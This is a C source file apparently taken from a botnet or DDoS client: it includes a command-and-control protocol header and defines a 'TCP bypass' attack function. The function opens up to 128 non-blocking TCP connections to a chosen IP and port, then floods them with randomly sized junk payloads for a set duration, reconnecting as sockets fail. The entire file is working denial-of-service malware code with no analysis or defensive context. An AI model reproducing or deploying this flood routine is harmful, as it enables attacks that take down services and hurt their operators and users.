#include "headers/includes.h"

#include "headers/attacks.h"
#include "headers/rand.h"
#include "headers/cnc_protocol.h"

#define MAX_FDS 128

void attack_tcp_bypass(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    int rand_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    uint16_t len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900);
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, port);

    struct sockaddr_in addr;
    char *buf = calloc(len, sizeof(char));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = inet_addr(ip);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    for (int i = 0; i < MAX_FDS; i++)
    {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        int err = 0;
        int err_len = sizeof(int);

        for(i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = (int)socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
#ifdef _WIN32
                    unsigned long mode = 1;
                    ioctlsocket(states[i].fd, FIONBIO, &mode);
#else
                    fcntl(states[i].fd, F_SETFL, O_NONBLOCK | fcntl(states[i].fd, F_GETFL, 0));
#endif

                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
                    {
#ifdef _WIN32
                        if (WSAGetLastError() != WSAEWOULDBLOCK) {
                            closesocket(states[i].fd);
                            states[i].fd = -1;
                            continue;
                        }
#else
                        if (errno != EINPROGRESS) {
                            close(states[i].fd);
                            states[i].fd = -1;
                            continue;
                        }
#endif
                    }
                    else
                    {
                        states[i].state = 2;
                        continue;
                    }

                    states[i].state = 1;
                    states[i].timeout = (uint32_t)time(NULL);
                    break;
                case 1:
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, (char *)&err, &err_len);

                        if(err)
                        {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }

                        states[i].state = 2;
                        continue;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                case 2:
                    {
                        int curr_len = len;
                        if (rand_len)
                            curr_len = (rand_next() % (len > 500 ? len - 500 : 1) + (len > 500 ? 500 : 0));

                        rand_str(buf, curr_len);

                        if(send(states[i].fd, buf, curr_len, 0) == -1)
                        {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                            states[i].timeout = 0;
                        }
                    }
                    break;
            }
        }
    }

    for (int i = 0; i < MAX_FDS; i++) {
        if (states[i].fd != -1) close(states[i].fd);
    }
    free(buf);
}
